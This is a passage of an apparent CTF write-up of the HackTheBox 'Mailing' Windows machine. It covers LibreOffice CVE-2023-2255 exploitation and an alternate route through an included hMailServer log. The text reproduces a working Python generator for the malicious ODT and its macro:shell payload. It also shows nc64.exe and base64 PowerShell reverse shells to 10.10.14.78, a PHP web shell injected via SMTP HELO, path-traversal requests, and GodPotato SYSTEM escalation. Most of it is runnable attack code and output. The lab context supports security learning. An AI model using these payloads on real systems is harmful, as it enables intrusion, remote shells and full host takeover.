UpdateID=LibreOffice_7_en-US_af_am_ar_as_ast_be_bg_bn_bn-IN_bo_br_brx_bs_ca_ca-valencia_ckb_cs_cy_da_de_dgo_dsb_dz_el_en-GB_en-ZA_eo_es_et_eu_fa_fi_fr_fur_fy_ga_gd_gl_gu_gug_he_hsb_hi_hr_hu_id_is_it_ja_ka_kab_kk_km_kmr-Latn_kn_ko_kok_ks_lb_lo_lt_lv_mai_mk_ml_mn_mni_mr_my_nb_ne_nl_nn_nr_nso_oc_om_or_pa-IN_pl_pt_pt-BR_ro_ru_rw_sa-IN_sat_sd_sr-Latn_si_sid_sk_sl_sq_sr_ss_st_sv_sw-TZ_szl_ta_te_tg_th_tn_tr_ts_tt_ug_uk_uz_ve_vec_vi_xh_zh-CN_zh-TW_zu
UpdateURL=https://update.libreoffice.org/check.php
UpgradeCode={4B17E523-5D91-4E69-BD96-7FD81CFA81BB}
UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation
```
- Looks like we're working with `LibreOffice v7.4.0.1`

## LibreOffice CVE-2023-2255
---
- Searching for CVEs for the corresponding version of `LibreOffice` brings us to the [link](https://security.snyk.io/vuln/SNYK-UNMANAGED-LIBREOFFICE-5603199) for a privesc vulnerability affecting `[7.4.0,7.4.7)`

### Background
- Improper access control in editor components of The Document Foundation LibreOffice allows an attacker to craft a document that would cause external links to be loaded without prompt
- There's a linked [Github POC](https://github.com/elweth-sec/CVE-2023-2255) that gives us a python script to generate the exploitable zipfile:
```python
import os
import zipfile
import argparse

def main():
    parser = argparse.ArgumentParser(description="CVE-2023-2255")
    parser.add_argument("--cmd", required=True, help="Command to execute")
    parser.add_argument("--output", default="output.odt", help="Output filename")
    args = parser.parse_args()
	
    with zipfile.ZipFile("./samples/test.odt", "r") as zip_ref:
        zip_ref.extractall("./tmp/")
	
    content_file = "./tmp/content.xml"
    with open(content_file, "r") as file:
        content = file.read()
	
    payload = args.cmd.replace(" ", "%20")
    new_content = content.replace("%PAYLOAD%", payload)
	
    with open(content_file, "w") as file:
        file.write(new_content)
	
    output_file = args.output
    with zipfile.ZipFile(output_file, "w") as zip_ref:
        for root, _, files in os.walk("./tmp/"):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = file_path.replace("./tmp/", "")
                zip_ref.write(file_path, arcname)
	
    for root, dirs, files in os.walk("./tmp/", topdown=False):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            os.rmdir(os.path.join(root, dir))
    os.rmdir("./tmp/")
	
    print(f"File {output_file} has been created !")

if __name__ == "__main__":
    main()
```

- Given the `--cmd id` it generates a zipfile with lots of files, but the meat of the exploit is located in `content.xml`:
```xml
❯ xmllint --format content.xml 
...
  <office:scripts>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="office:load-finished" xlink:href="macro:shell(%22id%22)" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
...
```

### Exploit
- We can grab a `nc64.exe` reverse shell to integrate into our exploit:
```sh
❯ python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.78 12345' --output exploit.odt
File exploit.odt has been created !
```

- We'll need to pass the malicious zipfile along with `nc64.exe` to the victim `Evil-WinRM` `upload` functionality
```powershell
*Evil-WinRM* PS C:\important documents> upload exploit.odt
Info: Uploading /home/aldamd/ctf/htb/Mailing - 10.129.232.39/exploit.odt to C:\important documents\exploit.odt
Data: 40736 bytes of 40736 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\programdata> upload nc64.exe
Info: Uploading /home/aldamd/ctf/htb/Mailing - 10.129.232.39/nc64.exe to C:\programdata\nc64.exe
Data: 60360 bytes of 60360 bytes copied
Info: Upload successful!
```

- After waiting a minute or so, we see a hit in our `netcat` listener!
- Now we can grab `root.txt`
```sh
❯ rlwrap -cAr nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.232.39.
Ncat: Connection from 10.129.232.39:58945.
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
mailing\localadmin
C:\Users\localadmin\Desktop>type root.txt
type root.txt
a08dd1e8b48e83e57210b66a4b815eae
```

# Unintended Route
## download.php Differences
---
```php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
	
    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        include($file_path); // instead of echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```
- This would allow us to execute `php` code if we can manage to get a `php` webshell on the box

## hMailServer Log Location
---
- Given that we can write to the mail logs, if we can write malicious `php` code via `SMTP` then reading the `hMailServer` logfile will give us RCE
- We can find after much searching that the log files are stored in `hmailserver\logs\hmailserver_%Y-%m-%d.log`
```http
GET /download.php?file=../../program+files+(x86)/hmailserver/logs/hmailserver_2026-02-12.log HTTP/1.1
Host: mailing.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mailing.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HTTP/1.1 200 OK
Cache-Control: must-revalidate
Pragma: public
Content-Type: application/octet-stream
Expires: 0
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
Content-Description: File Transfer
Content-Disposition: attachment; filename="hmailserver_2026-02-11.log"
X-Powered-By: ASP.NET
Date: Thu, 12 Feb 2026 01:33:56 GMT
Content-Length: 89609

"DEBUG"	3740	"2026-02-11 22:52:09.436"	"Application::InitInstance - Configuration loaded."
"DEBUG"	3740	"2026-02-11 22:52:09.483"	"Creating work queue Asynchronous task queue"
"DEBUG"	3740	"2026-02-11 22:52:09.483"	"Starting work queue Asynchronous task queue"
"DEBUG"	3740	"2026-02-11 22:52:09.483"	"Started work queue Asynchronous task queue"
"APPLICATION"	3740	"2026-02-11 22:52:09.483"	"Starting servers..."
...
```

## SMTP Log Poisoning
---
- We can connect to `SMTP` via `telnet`:
```sh
❯ telnet 10.129.232.39 25            
Trying 10.129.232.39...
Connected to 10.129.232.39.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO <?php echo "wallfly was here!"; ?>
250 Hello.
```

- Then we can inspect the log file again:
```http
GET /download.php?file=../../program+files+(x86)/hmailserver/logs/hmailserver_2026-02-12.log HTTP/1.1
...
"TCPIP"	4532	"2026-02-12 02:35:40.970"	"TCP - 10.10.14.78 connected to 10.129.232.39:25."
"DEBUG"	4532	"2026-02-12 02:35:40.970"	"TCP connection started for session 154"
"SMTPD"	4532	154	"2026-02-12 02:35:40.970"	"10.10.14.78"	"SENT: 220 mailing.htb ESMTP"
"SMTPD"	4512	154	"2026-02-12 02:35:45.204"	"10.10.14.78"	"RECEIVED: HELO wallfly was here!"
"SMTPD"	4512	154	"2026-02-12 02:35:45.204"	"10.10.14.78"	"SENT: 250 Hello."
"SMTPD"	4532	154	"2026-02-12 02:36:18.704"	"10.10.14.78"	"RECEIVED: [SMB] NTLMv2-SSP Client   : 10.129.232.39"
...
```

- We can send a `php` web shell the same way via `telnet`:
```sh
❯ telnet 10.129.232.39 25
Trying 10.129.232.39...
Connected to 10.129.232.39.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO <?php system($_REQUEST['cmd']); ?>
250 Hello.
```

- Now we should have a web shell!
```http
GET /download.php?file=../../program+files+(x86)/hmailserver/logs/hmailserver_2026-02-12.log&cmd=whoami HTTP/1.1
...

"SMTPD"	4512	155	"2026-02-12 02:40:53.985"	"10.10.14.78"	"RECEIVED: HELO iis apppool\defaultapppool
"
```
- We've got RCE! Now we just need to replace the command with a reverse Powershell payload

```http
GET /download.php?file=../../program+files+(x86)/hmailserver/logs/hmailserver_2026-02-12.log&cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA4ACIALAAxADIAMwA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA HTTP/1.1
Host: mailing.htb
```
```sh
❯ rlwrap -cAr nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.232.39.
Ncat: Connection from 10.129.232.39:60517.
whoami
iis apppool\defaultapppool
PS C:\wwwroot> 
```

## SeImpersonatePrivilege (GodPotato)
---
- We can enumerate the `iis apppool\defaultapppool` user's privileges and we notice that they've got `SeImpersonatePrivilege` which is vulnerable to the `Potato` family of privesc exploits, most recent and reliabe being [GodPotato](https://github.com/BeichenDream/GodPotato) 
- First we need to figure out what version of `.NET` we're running:
```powershell
PS C:\wwwroot> ls C:\Windows\Microsoft.NET\Framework

    Directorio: C:\Windows\Microsoft.NET\Framework

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                          
d-----        27/02/2024     16:58                3082                           
d-----        07/12/2019     10:31                v1.0.3705                      
d-----        07/12/2019     10:31                v1.1.4322                      
d-----        03/03/2024     17:16                v2.0.50727                     
d-----        27/02/2024     16:58                v3.0                           
d-----        27/02/2024     16:58                v3.5                           
d-----        11/02/2026     23:02                v4.0.30319
```

- We can use `3.5` just to be safe:
```powershell
PS C:\programdata> ./gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140720988553216
[*] DispatchTable: 0x140720990999976
[*] UseProtseqFunction: 0x140720990334688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d4df3301-605c-4980-ab55-11238c3cc1cd\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a802-1294-ffff-9f76-6ca36c9f98c1
[*] DCOM obj OXID: 0xa19628975f11beae
[*] DCOM obj OID: 0xe8f01b5072bfcfe9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 916 Token:0x760  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4320
nt authority\system
```
- Looks like it works!

- We can spawn a reverse shell as `root` with a `Powershell` base64 payload:
```powershell
PS C:\programdata> ./gp.exe -cmd 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA4ACIALAAxADIAMwA0ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
```sh
❯ rlwrap -cAr nc -lvnp 12346
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12346
Ncat: Listening on 0.0.0.0:12346
Ncat: Connection from 10.129.232.39.
Ncat: Connection from 10.129.232.39:56883.
whoami
nt authority\system
```
- And we've got `root`!





